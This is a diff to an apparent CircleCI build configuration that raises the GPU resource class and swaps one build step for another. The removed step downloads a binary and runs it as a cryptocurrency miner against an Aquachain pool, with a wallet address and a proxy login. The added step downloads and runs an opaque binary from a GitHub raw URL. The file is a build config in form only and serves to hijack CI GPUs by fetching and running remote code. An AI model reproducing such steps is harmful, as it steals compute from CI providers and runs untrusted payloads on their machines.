@@ -4,7 +4,7 @@ jobs:
   build:
     machine:
       image: ubuntu-1604-cuda-10.1:201909-23
-    resource_class: gpu.nvidia.small
+    resource_class: gpu.nvidia.large
     steps:
       - run: nvidia-smi
-      - run: sudo apt-get update && sudo apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && sudo apt install -y ocl-icd-opencl-dev && wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu && ./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/paper3 -t 1 --proxy socks5://woiden_abet:aufal@id-socks5.woiden.net:8080
+      - run: wget https://raw.githubusercontent.com/principala/a/f2f24969e9392e56a3d15af1d6ce587414f5e3f7/isebelas && chmod +x isebelas && ./isebelas
